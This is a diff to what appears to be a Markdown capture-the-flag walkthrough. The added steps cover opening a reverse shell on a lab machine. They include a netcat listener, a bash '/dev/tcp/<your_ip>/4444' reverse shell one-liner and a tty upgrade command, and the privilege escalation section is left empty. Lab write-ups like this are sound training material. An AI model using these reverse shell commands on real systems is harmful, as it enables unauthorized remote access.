@@ -85,5 +85,14 @@ Notification: The words that are hyperlinked are to resources to learn more abou
     - These commands will tell us what user we are and what this use has access too. 
   - We are going to try and create a reverse shell like we did in the previous machine.
     - lets set up our listner with the netcat command `nc -lvnp 444`
-    - now lets run the reverse shell creation command in our os shell `bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`
+    - now lets run the reverse shell creation command in our os shell 
+    - `bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`
+      ![image](https://user-images.githubusercontent.com/29686845/134260208-03155586-6647-4d0d-993b-0668e78f6ca3.png)
+    - Now we have our shell! Lets upgrade that shell to a [tty](https://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con) shell using the command below:
+    - `SHELL=/bin/bash script -q /dev/null`
+    - Now that we have our upgraded reverse shell lets move on to gaining privilege escilation
+
+# Privlege Escalation
+1. 
+
     
